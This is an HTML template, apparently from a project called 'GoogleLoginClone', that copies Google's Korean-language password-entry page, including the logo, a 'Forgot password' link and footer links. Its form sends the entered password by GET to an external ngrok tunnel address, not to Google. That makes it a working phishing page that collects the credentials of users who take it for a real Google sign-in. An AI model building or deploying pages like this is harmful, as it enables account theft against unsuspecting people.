<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/GoogleLoginClone/static/password.css">
    <title>로그인 - Google 계정 비번창</title>
</head>
<body>
    <div id="container">
        <div class="logo">
            <img src="/GoogleLoginClone/static/logo.png" alt="">
        </div>
        <h1>이메일에서 @ 이전까지의 이름</h1>
        <div class="email">
            <img src="#" alt="프사">
            <p>이메일 주소</p>
        </div>
        <br>
        <div class="forget">
            <form method="GET" action="https://cfba-49-168-88-14.ngrok-free.app/GoogleLoginClone/templates/password.html">

                <input id="password"
                placeholder=""
                type="password"
                pattern=".+@gmail\.com"
                autocomplete="off"
                name="email"
                required>

                <input id="submit"
                type="submit"
                value="다음">
                
            </form>

            <!-- <div class="placeholder">비밀번호 입력</div> -->
            <form class="checkbox">
                <input type="checkbox">
                <p>비밀번호 표시</p>
            </form>
        </div>
        <div class="account">
            <a href="#">비밀번호 찾기</a>
        </div>
    </div>
    
    <footer>
        <!-- <select name="language" id="language">
            <option value="ko">한국어</option>
            <option value="en">English</option>
            <option value="jp">日本語</option>
            <option value="ch">繁體中文</option>
        </select> -->
        <a href="#">도움말</a>
        <a href="#">개인정보처리방침</a>
        <a href="#">약관</a>
    </footer>
    
    <script src="/GoogleLoginClone/script.js"></script>
</body>
</html>
